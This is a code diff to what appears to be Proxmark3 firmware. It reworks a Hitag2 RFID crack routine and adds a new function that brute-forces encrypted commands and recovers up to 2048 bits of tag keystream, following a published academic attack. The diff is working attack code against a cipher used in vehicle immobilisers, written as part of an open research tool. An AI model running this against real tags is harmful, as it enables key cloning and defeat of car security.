@@ -19,7 +19,7 @@
 
 
 #include "hitag2_crack.h"
-#include "hitag2_crypto.h"
+#include "hitag2/hitag2_crypto.h"
 #include "hitag2.h"
 #include "proxmark3_arm.h"
 #include "commonutil.h"
@@ -28,16 +28,15 @@
 #include "string.h"
 #include "BigBuf.h"
 #include "cmd.h"
-
-const static uint8_t ERROR_RESPONSE[] = { 0xF4, 0x02, 0x88, 0x9C };
+#include "lfadc.h"
 
 // #define READP0CMD "1100000111"
 const static uint8_t read_p0_cmd[] = {1, 1, 0, 0, 0, 0, 0, 1, 1, 1};
 
 // hitag2crack_xor XORs the source with the pad to produce the target.
 // source, target and pad are binarrays of length len.
-static void hitag2crack_xor(uint8_t *target, const uint8_t *source, const uint8_t *pad, uint16_t len) {
-    for (uint16_t i = 0; i < len; i++) {
+static void hitag2crack_xor(uint8_t *target, const uint8_t *source, const uint8_t *pad, size_t len) {
+    for (size_t i = 0; i < len; i++) {
         target[i] = source[i] ^ pad[i];
     }
 }
@@ -48,20 +47,18 @@ static void hitag2crack_xor(uint8_t *target, const uint8_t *source, const uint8_
 // nrar is the 64 bit binarray of the nR aR pair;
 // cmd is the binarray of the encrypted command to send;
 // len is the length of the encrypted command.
-static bool hitag2crack_send_e_cmd(uint8_t *resp, uint8_t *nrar, uint8_t *cmd, int len) {
+static bool hitag2crack_send_e_cmd(uint8_t *resp, uint8_t *nrar, uint8_t *cmd, size_t len) {
 
     memset(resp, 0, 4);
 
     // Get UID
-    uint8_t uid[4];
-    if (ht2_read_uid(uid, false, false, true) != PM3_SUCCESS) {
+    if (ht2_read_uid(NULL, true, false, true) != PM3_SUCCESS) {
         return false;
     }
 
     // send nrar and receive (useless) encrypted page 3 value
-    uint8_t e_page3[4];
     size_t n = 0;
-    if (ht2_tx_rx(nrar, 64, e_page3, &n, true, true) != PM3_SUCCESS) {
+    if (ht2_tx_rx(nrar, 64, NULL, &n, true, true) != PM3_SUCCESS) {
         return false;
     }
 
@@ -114,22 +111,18 @@ static bool hitag2crack_read_page(uint8_t *resp, uint8_t pagenum, uint8_t *nrar,
     uint8_t e_resp[4];
     if (hitag2crack_send_e_cmd(e_resp, nrar, e_cmd, 10)) {
 
-        // check if it is valid   OBS!
-        if (memcmp(e_resp, ERROR_RESPONSE, 4)) {
+        uint8_t e_response[32] = {0};
+        uint8_t response[32] = {0};
 
-            uint8_t e_response[32];
-            uint8_t response[32];
+        // convert to binarray
+        hex2binarray_n((char *)e_response, (char *)e_resp, 4);
+        // decrypt response
+        hitag2crack_xor(response, e_response, keybits + 10, 32);
 
-            // convert to binarray
-            hex2binarray((char *)e_response, (char *)e_resp);
-            // decrypt response
-            hitag2crack_xor(response, e_response, keybits + 10, 32);
+        // convert to hexstring
+        binarray2hex(response, 32, resp);
 
-            // convert to hexstring
-            binarray2hex(response, 32, resp);
-
-            return true;
-        }
+        return true;
     }
 
     return false;
@@ -146,12 +139,12 @@ static bool hitag2crack_read_page(uint8_t *resp, uint8_t pagenum, uint8_t *nrar,
 // e_uid is the binarray of the encrypted version of the UID.
 static bool hitag2crack_test_e_p0cmd(uint8_t *keybits, uint8_t *nrar, uint8_t *e_cmd, uint8_t *uid, uint8_t *e_uid) {
 
-    uint8_t cipherbits[42];
+    uint8_t cipherbits[42] = {0};
     memcpy(cipherbits, e_cmd, 10);          // copy encrypted cmd to cipherbits
     memcpy(cipherbits + 10, e_uid, 32);     // copy encrypted uid to cipherbits
 
 
-    uint8_t plainbits[42];
+    uint8_t plainbits[42] = {0};
     memcpy(plainbits, read_p0_cmd, sizeof(read_p0_cmd));    // copy cmd to plainbits
     memcpy(plainbits + 10, uid, 32);                        // copy uid to plainbits
 
@@ -159,24 +152,17 @@ static bool hitag2crack_test_e_p0cmd(uint8_t *keybits, uint8_t *nrar, uint8_t *e
     hitag2crack_xor(keybits, plainbits, cipherbits, 42);
 
     // create extended cmd -> 4 * READP0CMD = 40 bits
-    uint8_t ext_cmd[40];
-    memcpy(ext_cmd, read_p0_cmd, sizeof(read_p0_cmd));
-    memcpy(ext_cmd + 10, read_p0_cmd, sizeof(read_p0_cmd));
-    memcpy(ext_cmd + 20, read_p0_cmd, sizeof(read_p0_cmd));
-    memcpy(ext_cmd + 30, read_p0_cmd, sizeof(read_p0_cmd));
-
     // xor extended cmd with keybits
-    uint8_t e_ext_cmd[40];
-    hitag2crack_xor(e_ext_cmd, ext_cmd, keybits, 40);
+    uint8_t e_ext_cmd[40] = {0};
+    hitag2crack_xor(e_ext_cmd, read_p0_cmd, keybits, 10);
+    hitag2crack_xor(e_ext_cmd + 10, read_p0_cmd, keybits + 10, 10);
+    hitag2crack_xor(e_ext_cmd + 20, read_p0_cmd, keybits + 20, 10);
+    hitag2crack_xor(e_ext_cmd + 30, read_p0_cmd, keybits + 30, 10);
 
     // send extended encrypted cmd
-    uint8_t resp[4];
+    uint8_t resp[4] = {0};
     if (hitag2crack_send_e_cmd(resp, nrar, e_ext_cmd, 40)) {
-
-        // test if it was valid
-        if (memcmp(resp, ERROR_RESPONSE, 4)) {
-            return true;
-        }
+        return true;
     }
     return false;
 }
@@ -202,6 +188,7 @@ static bool hitag2crack_find_e_page0_cmd(uint8_t *keybits, uint8_t *e_firstcmd, 
                     // encrypted command.
                     uint8_t guess[10];
                     memcpy(guess, e_firstcmd, 10);
+
                     if (a) {
                         guess[5] = !guess[5];
                         guess[0] = !guess[0];
@@ -223,20 +210,17 @@ static bool hitag2crack_find_e_page0_cmd(uint8_t *keybits, uint8_t *e_firstcmd, 
                     }
 
                     // try the guess
-                    uint8_t resp[4];
+                    uint8_t resp[4] = {0};
                     if (hitag2crack_send_e_cmd(resp, nrar, guess, 10)) {
 
-                        // check if it was valid
-                        if (memcmp(resp, ERROR_RESPONSE, 4)) {
+                        // convert response to binarray
+                        // response should been encrypted UID
+                        uint8_t e_uid[32] = {0};
+                        hex2binarray_n((char *)e_uid, (char *)resp, 4);
 
-                            // convert response to binarray
-                            uint8_t e_uid[32];
-                            hex2binarray((char *)e_uid, (char *)resp);
-
-                            // test if the guess was 'read page 0' command
-                            if (hitag2crack_test_e_p0cmd(keybits, nrar, guess, uid, e_uid)) {
-                                return true;
-                            }
+                        // test if the guess was 'read page 0' command
+                        if (hitag2crack_test_e_p0cmd(keybits, nrar, guess, uid, e_uid)) {
+                            return true;
                         }
                     }
                 }
@@ -263,29 +247,15 @@ static bool hitag2crack_find_valid_e_cmd(uint8_t *e_cmd, uint8_t *nrar) {
                         for (uint8_t g = 0; g < 2; g++) {
 
                             // build binarray
-                            //uint8_t guess[10] = { a, b, c, d, e, 0, g, 0, 0, 0 };
-                            uint8_t guess[10];
-                            guess[0] = a;
-                            guess[1] = b;
-                            guess[2] = c;
-                            guess[3] = d;
-                            guess[4] = e;
-                            guess[5] = 0;
-                            guess[6] = g;
-                            guess[7] = 0;
-                            guess[8] = 0;
-                            guess[9] = 0;
+                            uint8_t guess[10] = { a, b, c, d, e, 0, g, 0, 0, 0 };
 
                             // send guess
-                            uint8_t resp[4];
+                            uint8_t resp[4] = {0};
                             if (hitag2crack_send_e_cmd(resp, nrar, guess, sizeof(guess))) {
 
-                                // check if it was valid
-                                if (memcmp(resp, ERROR_RESPONSE, 4)) {
-                                    // return the guess as the encrypted command
-                                    memcpy(e_cmd, guess, 10);
-                                    return true;
-                                }
+                                // return the guess as the encrypted command
+                                memcpy(e_cmd, guess, 10);
+                                return true;
                             }
                         }
                     }
@@ -296,11 +266,18 @@ static bool hitag2crack_find_valid_e_cmd(uint8_t *e_cmd, uint8_t *nrar) {
     return false;
 }
 
+typedef struct {
+    uint8_t keybits[2080];
+    uint8_t uid[32];
+    uint8_t nrar[64];
+    uint8_t e_ext_cmd[2080];
+} PACKED lf_hitag_crack2_t;
+
 // hitag2_crack implements the first crack algorithm described in the paper,
 // Gone In 360 Seconds by Verdult, Garcia and Balasch.
 // response is a multi-line text response containing the 8 pages of the cracked tag
 // nrarhex is a string containing hex representations of the 32 bit nR and aR values
-void ht2_crack(uint8_t *nrar_hex) {
+void ht2_crack1(uint8_t *nrar_hex) {
 
     clear_trace();
 
@@ -340,7 +317,6 @@ void ht2_crack(uint8_t *nrar_hex) {
         res = PM3_EFAILED;
         goto out;
     }
-
     // read all pages using key stream
     for (uint8_t i = 1; i < 8; i++) {
         hitag2crack_read_page(packet.data + (i * 4), i, nrar, keybits);
@@ -353,4 +329,113 @@ void ht2_crack(uint8_t *nrar_hex) {
 
 out:
     reply_ng(CMD_LF_HITAG2_CRACK, res, (uint8_t *)&packet, sizeof(lf_hitag_crack_response_t));
+}
+
+// hitag2_keystream uses the first crack algorithm described in the paper,
+// Gone In 360 Seconds by Verdult, Garcia and Balasch, to retrieve 2048 bits of keystream.
+// response is a multi-line text response containing the hex of the keystream;
+// nrar_hex is the 32 bit nR and aR in hex
+void ht2_crack2(uint8_t *nrar_hex) {
+
+    BigBuf_free();
+
+    uint8_t *e_response = BigBuf_calloc(32);
+    lf_hitag_crack2_t *c2 = (lf_hitag_crack2_t *)BigBuf_calloc(sizeof(lf_hitag_crack2_t));
+
+    g_logging = false;
+    LEDsoff();
+    set_tracing(false);
+    clear_trace();
+
+    // find the 'read page 0' command and recover key stream
+
+    // get uid as hexstring
+    uint8_t uid_hex[4] = {0};
+    if (ht2_read_uid(uid_hex, false, false, false) != PM3_SUCCESS) {
+        BigBuf_free();
+        reply_ng(CMD_LF_HITAG2_CRACK_2, PM3_EFAILED, NULL, 0);
+        return;
+    }
+
+    hex2binarray_n((char *)c2->uid, (char *)uid_hex, 4);
+    hex2binarray_n((char *)c2->nrar, (char *)nrar_hex, 8);
+
+    DbpString("looking for encrypted command");
+
+    // find a valid encrypted command
+    uint8_t e_firstcmd[10] = {0};
+    if (hitag2crack_find_valid_e_cmd(e_firstcmd, c2->nrar) == false) {
+        BigBuf_free();
+        reply_ng(CMD_LF_HITAG2_CRACK_2, PM3_EFAILED, NULL, 0);
+        return;
+    }
+
+    DbpString("looking for encrypted page 0");
+    // find encrypted page0 commnd
+    if (hitag2crack_find_e_page0_cmd(c2->keybits, e_firstcmd, c2->nrar, c2->uid) == false) {
+        BigBuf_free();
+        reply_ng(CMD_LF_HITAG2_CRACK_2, PM3_EFAILED, NULL, 0);
+        return;
+    }
+
+    // We got 42 bits of keystream in c2->keybits.
+    // using the 40 bits of keystream in keybits, sending commands with ever
+    // increasing lengths to acquire 2048 bits of key stream.
+    int kslen = 40;
+    int res = PM3_SUCCESS;
+
+    while (kslen < 2048 && BUTTON_PRESS() == false) {
+
+        hitag2crack_xor(c2->e_ext_cmd,      read_p0_cmd, c2->keybits, 10);
+        hitag2crack_xor(c2->e_ext_cmd + 10, read_p0_cmd, c2->keybits + 10, 10);
+        hitag2crack_xor(c2->e_ext_cmd + 20, read_p0_cmd, c2->keybits + 20, 10);
+        hitag2crack_xor(c2->e_ext_cmd + 30, read_p0_cmd, c2->keybits + 30, 10);
+
+        Dbprintf("Recovered " _YELLOW_("%4i") " bits of keystream", kslen);
+
+        // Get UID
+        if (ht2_read_uid(NULL, true, false, true) != PM3_SUCCESS) {
+            res = PM3_EFAILED;
+            break;
+        }
+
+        // send nrar and receive (useless) encrypted page 3 value
+        size_t n = 0;
+        if (ht2_tx_rx(c2->nrar, 64, NULL, &n, true, true) != PM3_SUCCESS) {
+            res = PM3_EFAILED;
+            break;
+        }
+
+        uint8_t resp[4] = {0};
+        res = ht2_tx_rx(c2->e_ext_cmd, kslen, resp, &n, true, false);
+        if (res != PM3_SUCCESS) {
+            Dbprintf("tx/rx failed, got %zu (res... %i)", n, res);
+            break;
+        }
+
+        // convert response to binarray
+        hex2binarray_n((char *)e_response, (char *)resp, 4);
+
+        // recover keystream from encrypted response
+        hitag2crack_xor(c2->keybits + kslen, e_response, c2->uid, 32);
+
+        // extented with 30 bits or  3 * 10 read_p0_cmds
+        hitag2crack_xor(c2->e_ext_cmd + kslen, read_p0_cmd, c2->keybits + kslen, 10);
+        kslen += 10;
+        hitag2crack_xor(c2->e_ext_cmd + kslen, read_p0_cmd, c2->keybits + kslen, 10);
+        kslen += 10;
+        hitag2crack_xor(c2->e_ext_cmd + kslen, read_p0_cmd, c2->keybits + kslen, 10);
+        kslen += 10;
+    }
+
+    Dbprintf("Recovered " _YELLOW_("%4i") " bits of keystream", kslen);
+
+    lf_hitag_crack_response_t *packet = (lf_hitag_crack_response_t *)BigBuf_calloc(sizeof(lf_hitag_crack_response_t));
+
+    packet->status = 1;
+    binarray2hex(c2->keybits, kslen, packet->data);
+
+    reply_ng(CMD_LF_HITAG2_CRACK_2, res, (uint8_t *)packet, sizeof(lf_hitag_crack_response_t));
+    BigBuf_free();
+    return;
 }
